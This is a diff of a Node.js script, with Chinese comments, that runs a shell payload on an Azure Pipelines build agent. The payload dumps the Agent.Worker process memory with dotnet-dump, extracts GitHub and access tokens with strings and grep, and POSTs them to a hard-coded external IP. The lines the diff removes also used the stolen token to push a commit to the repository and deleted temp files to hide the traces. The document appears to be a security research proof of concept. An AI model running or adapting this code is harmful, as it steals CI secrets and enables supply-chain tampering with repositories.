@@ -1,99 +1,45 @@
 const { execSync } = require('child_process');
 
 const script = `
-    # 1. 安装工具
-    dotnet tool install --global dotnet-dump;
+    # 1. 安装工具 (如果已安装可忽略错误)
+    dotnet tool install --global dotnet-dump || true;
 
-    # 2. 获取 Agent 进程 PID
+    # 2. 获取 PID
     PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}');
-
     if [ -z "$PID" ]; then
         echo "Error: Unable to find PID for Agent.Worker."
         exit 1
     fi
 
-    BUILD_REPOSITORY_URI=$("https://github.com/ckx-sec/test_azure_function_private");
-
-    echo "The PID of Agent.Worker is $PID";
-    echo "Target Repo: $BUILD_REPOSITORY_URI";
-
     # 3. 内存 Dump
-    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
+    rm -f /home/vsts/work/_temp/heap_worker.bin
+    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin > /dev/null
 
-    # 4. 提取敏感信息 (GitHub Token 和 Access Token)
-    # 注意：这里假设 GH_TOKEN 格式符合 gh._[A-Za-z0-9]+
+    # 4. 提取敏感信息
     GH_TOKEN=$(strings -e b -n 20 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"' | head -n 1 | sed -Ee 's/.*"(gh._[A-Za-z0-9]+)".*/\\1/');
     ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"AccessToken":".+"' | head -n 1 | sed -Ee 's/.*AccessToken":"([^"]+)".*/\\1/');
 
-    # 5. (可选) 数据外带 - 发送到攻击者服务器
-    if [ ! -z "$GH_TOKEN" ] || [ ! -z "$ACCESS_TOKEN" ]; then
-        curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$GH_TOKEN\\",\\"repoUrl\\": \\"$BUILD_REPOSITORY_URI\\"}" http://139.180.193.16:7777
-    fi
-
-    echo "Extracted GH_TOKEN=$GH_TOKEN"
-    echo "Extracted ACCESS_TOKEN=$ACCESS_TOKEN"
-
-    # ==========================================
-    # 新增：利用 GH_TOKEN 篡改代码库
-    # ==========================================
-    if [ ! -z "$GH_TOKEN" ]; then
-        echo "Starting malicious repository modification using extracted GH_TOKEN..."
-
-        # 构造带有 Token 认证的 URL
-        # 将 https://github.com/... 替换为 https://<TOKEN>@github.com/...
-        # 注意：BUILD_REPOSITORY_URI 环境变量通常由 Azure Pipelines 自动提供
-        AUTH_REPO_URL=$(echo $BUILD_REPOSITORY_URI | sed "s/https:\/\//https:\/\/$GH_TOKEN@/")
-
-        # 在临时目录进行操作，避免干扰当前工作区
-        TEMP_DIR="/tmp/pwn_test_$(date +%s)"
-        mkdir -p $TEMP_DIR
-        cd $TEMP_DIR
-
-        # 克隆仓库
-        echo "Cloning repository..."
-        git clone $AUTH_REPO_URL repo
-        
-        if [ -d "repo" ]; then
-            cd repo
-            
-            # 配置攻击者身份（用于 Commit 记录）
-            git config user.email "security-audit@example.com"
-            git config user.name "Security Audit Bot"
-
-            # 写入恶意文件或后门
-            echo "This file demonstrates write access via leaked GH_TOKEN from process memory." > compromised_audit.txt
-            date >> compromised_audit.txt
-            
-            # 提交并推送
-            echo "Committing and pushing changes..."
-            git add compromised_audit.txt
-            git commit -m "chore: update audit logs [skip ci]"
-            
-            # 尝试推送到当前分支 (通常是 main 或 master，取决于 BUILD_SOURCEBRANCHNAME)
-            # 如果不知道具体分支，可以尝试 HEAD
-            git push origin HEAD
-            
-            if [ $? -eq 0 ]; then
-                echo "SUCCESS: Repository compromised successfully."
-            else
-                echo "FAILED: Git push failed (Token might be read-only or branch protected)."
-            fi
-        else
-            echo "FAILED: Git clone failed (Token might be invalid)."
-        fi
-
-        # 清理痕迹
-        cd ..
-        rm -rf $TEMP_DIR
-    else
-        echo "No GH_TOKEN found, skipping repository modification."
-    fi
-`
+    echo "Extracted GH_TOKEN: $GH_TOKEN"
+    
+    # 5. 发送数据 (关键修复部分)
+    # 使用 tr -d '\\n' 确保 base64 结果不换行
+    B64_ACCESS=$(echo -n "$ACCESS_TOKEN" | base64 | tr -d '\\n')
+    
+    # 构造 JSON 字符串，确保是一个单行、合法的 JSON
+    # 注意：BUILD_REPOSITORY_URI 可能包含斜杠，但在 JSON 字符串值中是安全的
+    JSON_DATA="{\\"accessToken\\":\\"$B64_ACCESS\\",\\"gh\\":\\"$GH_TOKEN\\",\\"repoUrl\\":\\"$BUILD_REPOSITORY_URI\\"}"
+    
+    echo "Sending JSON payload..."
+    
+    # 使用 curl 发送，添加 -v 查看详细通信过程以便调试
+    curl -v -X POST -H "Content-Type: application/json" -d "$JSON_DATA" http://139.180.193.16:7777
+`;
 
 try {
-    console.log(execSync(script, { encoding: 'utf8', maxBuffer: 1024 * 1024 * 50 })); // 增加 buffer 以防输出过长
+    // 增加 maxBuffer 防止输出截断
+    console.log(execSync(script, { encoding: 'utf8', maxBuffer: 50 * 1024 * 1024 }));
 } catch (e) {
-    console.error("Script execution failed:");
-    console.error(e.stdout); // 打印标准输出以便调试
-    console.error(e.stderr); // 打印错误输出
+    console.error("Execution Error:");
+    console.error(e.stdout); // 打印标准输出
+    console.error(e.stderr); // 打印错误信息
 }
